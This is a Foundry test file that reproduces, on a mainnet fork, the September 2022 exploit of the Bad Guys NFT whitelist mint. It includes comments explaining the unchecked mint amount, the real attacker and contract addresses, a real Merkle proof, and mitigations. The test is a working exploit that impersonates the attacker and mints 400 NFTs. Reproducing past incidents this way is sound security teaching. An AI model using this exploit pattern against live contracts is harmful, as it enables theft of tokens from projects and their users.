// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {CheatCodes} from "../interfaces/00_CheatCodes.interface.sol";

// forge test --match-contract Exploit_Bad_Guys_NFT -vvv
/*
On Sept 02, 2022 an attacker minted 400 NFTs from a WhitelistMint from the Bad Guys NFT project.

// Attack Overview
Total Lost: 400 NFTs
Attack Tx: https://etherscan.io/tx/0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f

Project owner: (rugpullfinder.eth) - 0x09eff2449882f9e727a8e9498787f8ff81465ade
Exploited Contract: 0xb84cbaf116eb90fd445dd5aeadfab3e807d2cbac
Attacker Address: 0xbd8a137e79c90063cd5c0db3dbabd5ca2ec7e83e
Attack Block: 15460094 

// Key Info Sources
Twitter: https://twitter.com/RugDoctorApe/status/1565739119606890498
Code: https://etherscan.io/address/0xb84cbaf116eb90fd445dd5aeadfab3e807d2cbac#code#L1190


Principle: Unchecked minting amount

    function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount)
        public
    {
        require(_numberMinted(msg.sender)<1, "Already Claimed");
        require(isPaused == false, "turn on minting");
        require(
            chosenAmount > 0,
            "Number Of Tokens Can Not Be Less Than Or Equal To 0"
        );
        require(
            totalSupply() + chosenAmount <= maxsupply - reserve,
            "all tokens have been minted"
        );
        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
        require(
            MerkleProof.verify(_merkleProof, rootHash, leaf),
            "Invalid Proof"
        );
        _safeMint(msg.sender, chosenAmount);
    }

ATTACK:
1) If whitelisted, just call WhiteListMint(myProof, anyAmount);
This is possible as the return value of the function _numberMinted is updated on _safeMint(), which is called after its check.
Also, if the max amount to be minted per user should be 1, the chosenAmount input should have also been checked.

MITIGATIONS:
1) Check both that the accounting mapping and the amount requested to mint fits with the current contract restrictions.
2) Use non manipulable mappings to check minting amounts instead of token.balanceOf(minter), which could be gamed by minting, transfering, minting...

*/
interface IBadGuys {
    function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount) external;
    function flipPauseMinting() external;
    function balanceOf(address owner) external view returns (uint256 balance);
}

contract Exploit_Bad_Guys_NFT is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IBadGuys internal constant nft = IBadGuys(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
    address internal constant PROJECT_OWNER = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade;
    address internal constant ATTACKER = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;
    
    function setUp() external {
        cheat.createSelectFork("mainnet", 15460093); // One before the mint

        cheat.prank(PROJECT_OWNER);
        nft.flipPauseMinting();

    }

    function test_attack() external {
        bytes32[] memory merkleProof = new bytes32[](15);

        merkleProof[0]  = 0xa3299324d1c59598e0dfa68de8d8c03d7492d88f6068cdd633a74eb9212e19e5;
        merkleProof[1]  = 0x5dcd197f362a82daaf56545974db26aabfe335be4c7eef015d3d74ccea4bf511;
        merkleProof[2]  = 0x18d716ad7f5113fe53b24a30288c6989dd04e6ad881be58b482d8d58f71c42da;
        merkleProof[3]  = 0x97a98e092a76c15cef3709df2776cf974e2519231e79c9ad97c15a1835c5c4be;
        merkleProof[4]  = 0x171696d6231b4a201927b35fe2dae4b91cefb62bef849a143560ebbb49cee5df;
        merkleProof[5]  = 0xe89305151bbec931414ab9693bf886cf3b96dba00ca338b1c0aaae911b6dff35;
        merkleProof[6]  = 0x69691b91227fa34a7a9a691d355fd6c466370928ddf3d50a347e894970f10079;
        merkleProof[7]  = 0x78299a273b7d50bcb1d75df1694be463b9cc66c6520026b785615c4594dbb1ba;
        merkleProof[8]  = 0xb297db4d926f0ebc26e098afcefa63d1d86d2e047ecbc36357192ef5240ea0ea;
        merkleProof[9]  = 0xb875ced562ca82ce114152c899bbd085d230a17be452243fda43bf995774243e;
        merkleProof[10] = 0xd284a1831379548ff6bb0b5ad75ce8d0d1fea1cdc7b40b5f8d2e2307c9eda32c;
        merkleProof[11] = 0x7eff30a405cfce9989fe9d71e346d7b3616fa69b8251782898226268818f63fb;
        merkleProof[12] = 0x651ec4246f6e842692770a6ebd63396b4d62b52a3406522a02f182b8a16ba48c;
        merkleProof[13] = 0xee17656e8a839ac096dd5905744ada01278fc49b978260e9e3ddd92223cc18d7;
        merkleProof[14] = 0xce5c61c22a5d840c02b32aaebf73c9bc3c3d71c49f22b22c4f3cae4aa1fd557b;

        emit log_string("Attacker balance");
        emit log_named_decimal_uint("Before mint", nft.balanceOf(ATTACKER),0);
        cheat.prank(ATTACKER);
        nft.WhiteListMint(merkleProof, 400);
        emit log_named_decimal_uint("After mint", nft.balanceOf(ATTACKER), 0);
    }        
   

}